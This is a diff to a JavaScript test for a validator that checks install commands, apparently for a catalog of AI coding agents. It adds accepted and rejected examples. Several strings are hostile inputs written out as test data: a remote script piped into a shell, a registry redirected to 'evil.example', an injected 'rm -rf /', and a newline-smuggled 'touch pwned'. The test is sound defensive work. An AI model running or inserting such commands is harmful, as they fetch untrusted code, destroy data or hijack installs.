@@ -62,7 +62,7 @@ console.log("ok 2: formatDetected truncates");
 // 3. The one rule: every shipped install string passes; shell tricks do not.
 {
   const shipped = CATALOG.filter((a) => a.install !== undefined).map((a) => a.install);
-  assert.equal(shipped.length, 19, "the verified catalog entries with an install");
+  assert.equal(shipped.length, 18, "the verified catalog entries with an install");
   for (const command of shipped) assert.ok(isRunnableInstall(command), `shipped: ${command}`);
 
   for (const command of [
@@ -71,6 +71,8 @@ console.log("ok 2: formatDetected truncates");
     "npm install -g @deepseek-ai/dsh @deepseek-harness-tui/dsh-tui",
     "pip install aider-chat",
     "python -m pip install aider-install && aider-install",
+    "npm install -g --ignore-scripts @earendil-works/pi-coding-agent",
+    "uv tool install some-agent",
     "brew install goose",
     "curl -fsSL https://example.com/install.sh | sh",
     "curl -LsSf https://example.com/x.sh | bash",
@@ -93,6 +95,12 @@ console.log("ok 2: formatDetected truncates");
     "python -m pip install x && aider-install && rm",
     "pip install x && rm",
     "pip install x && sh",
+    "npm i -g --registry=http://evil.example x",
+    "npm i -g --ignore-scripts --foo x",
+    "npm i -g --ignore-scripts",
+    "uv tool install --python 3.12 x",
+    "uv tool run x",
+    "uv tool install x; rm -rf /",
     "npm i -g x\ntouch pwned",
     null,
   ]) assert.equal(isRunnableInstall(command), false, `rejects ${JSON.stringify(command)}`);
